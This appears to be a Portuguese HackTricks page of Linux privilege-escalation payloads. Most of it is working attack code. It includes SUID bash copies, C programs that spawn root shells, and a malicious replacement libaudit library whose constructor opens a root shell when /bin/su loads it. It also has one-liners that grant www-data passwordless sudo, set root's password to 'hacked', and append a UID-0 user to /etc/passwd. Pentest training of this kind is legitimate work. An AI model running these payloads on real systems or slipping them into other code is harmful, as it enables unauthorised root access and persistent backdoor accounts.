# Payloads para executar

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` habilita o modo privilegiado: quando o Bash é iniciado com IDs real e efetivo diferentes, ele não redefine o ID efetivo para o ID real. O shell resultante ainda depende das credenciais existentes do chamador.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` altera os IDs real, efetivo e salvo quando permitido, enquanto `setuid` altera o ID efetivo e também pode definir os IDs real e salvo para um chamador privilegiado. `execve` substitui a imagem do processo atual pelo programa solicitado.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Estes exemplos omitem verificações dos valores de retorno; ambas as chamadas de credenciais podem falhar mesmo para UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Sobrescrevendo um arquivo para escalonar privilégios

### Arquivos comuns

Estes são arquivos e interfaces locais comuns de controle de privilégios: `/etc/passwd` armazena registros de contas com sete campos, `/etc/shadow` armazena dados de senha criptografados opcionais, `sudoers` define privilégios do sudo e tags como `NOPASSWD`, e o endpoint daemon padrão do Docker é um socket Unix em `/var/run/docker.sock`; o acesso a esse socket pode conceder controle no nível root do host.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Adicionar usuário com senha a _/etc/passwd_
- Alterar a senha dentro de _/etc/shadow_
- Adicionar usuário ao sudoers em _/etc/sudoers_
- Abusar do Docker através do socket do Docker, geralmente em _/run/docker.sock_ ou _/var/run/docker.sock_

### Sobrescrevendo uma biblioteca

Verifique quais bibliotecas compartilhadas um binário utiliza; neste exemplo, inspecione `/bin/su` com `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` relata as dependências de shared objects, enquanto o dynamic linker usa metadados ELF e suas regras de pesquisa para carregá-los em runtime.<sup>[[9]](#references)[[10]](#references)</sup>

Para inspecionar um candidato, use `objdump -T` para exibir a tabela de símbolos dinâmica de `su` e filtre por nomes de auditoria.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` e `audit_log_acct_message` são funções da libaudit; `audit_fd` é mostrado como um objeto de dados definido na seção `.bss` de `su` nesta saída.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Uma replacement library deve exportar definições compatíveis para os símbolos indefinidos que o loader resolve; ABIs incompatíveis de funções/dados ainda podem fazer o processo falhar quando esses símbolos são relocados ou chamados.<sup>[[10]](#references)[[11]](#references)</sup>

O atributo `constructor` do GCC faz com que `inject` seja chamado automaticamente antes de `main` em targets compatíveis.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Se a substituição for carregada com sucesso por um processo **`/bin/su`** privilegiado, este constructor poderá iniciar **`/bin/bash`** com os privilégios desse processo; o resultado exato depende do ambiente.<sup>[[10]](#references)[[15]](#references)</sup>

## Scripts

Você consegue fazer o root executar alguma coisa?

`sudoers` usa a tag `NOPASSWD` nas entradas de política, `chpasswd` lê pares `user:password` da entrada padrão, e `/etc/passwd` usa sete campos de conta separados por dois-pontos; os exemplos a seguir presumem que os arquivos relevantes podem ser gravados pelo processo que os executa.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data para sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Alterar senha do root**
```bash
echo "root:hacked" | chpasswd
```
### Adicionar novo usuário root ao /etc/passwd

O payload final depende de um alvo que aceite o hash `crypt` gerado: o `mkpasswd -m sha-512` do Debian mapeia para SHA-512 crypt (`$6$`), enquanto o `passwd -1 -salt` do OpenSSL usa o algoritmo BSD baseado em MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [O builtin Set (Manual de Referência do Bash)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — página de manual do Linux](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — página de manual do Linux](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — página de manual do Linux](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — página de manual do Linux](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Páginas de manual do Debian](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Proteja o socket do daemon do Docker](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Documentação do Docker](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — página de manual do Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (Utilitários Binários do GNU)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Páginas de manual do Debian](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Páginas de manual do Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Páginas de manual do Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Atributos comuns (Usando a GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Fontes do Debian](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — Documentação do OpenSSL](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
